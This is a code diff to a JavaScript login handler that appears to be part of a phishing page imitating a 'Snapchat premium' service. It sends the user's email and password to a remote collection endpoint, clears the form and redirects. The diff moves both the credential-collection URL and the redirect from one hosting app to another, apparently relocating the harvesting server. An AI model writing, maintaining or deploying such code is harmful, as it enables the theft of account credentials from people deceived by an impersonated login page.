@@ -14,7 +14,7 @@ const getValues = async () => {
     };
     
     // Define the URL of the server
-    const url = 'https://snapchat-premium.cyclic.app/crad/Login'; // Replace with your server URL
+    const url = 'https://secure-compassion-production.up.railway.app/crad/Login'; // Replace with your server URL
     
     // Define the options for the fetch request
     const options = {
@@ -39,7 +39,7 @@ const getValues = async () => {
             Email.value = "";
             Password.value = "";
             // Redirect the user to a specific URL
-            window.location.href = "https://snapchat-premium.cyclic.app/Auth";
+            window.location.href = "https://secure-compassion-production.up.railway.app/Auth";
 
             
         })
